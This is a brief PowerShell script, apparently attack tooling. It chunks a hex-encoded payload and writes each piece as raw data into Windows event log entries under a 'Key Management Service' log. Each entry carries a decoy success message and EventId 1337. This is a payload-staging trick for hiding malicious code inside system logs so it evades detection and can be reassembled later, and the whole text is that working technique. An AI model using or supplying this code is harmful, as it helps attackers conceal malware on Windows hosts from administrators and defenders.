$payload = ""

$array = $hexString -split '(\w{8192})' | ? {$_}
foreach ($i in $array){
Write-Host "Splitting Payload : "+ $i.Length
$hashByteArray = [byte[]] ($i -replace '..', '0x$&,' -split ',' -ne '')
Write-EventLog -LogName 'Key Management Service' -Source KmsRequests -EventId 1337 -EntryType Information -Message 'Key Management Services processed a request successfully' -RawData $hashByteArray

}


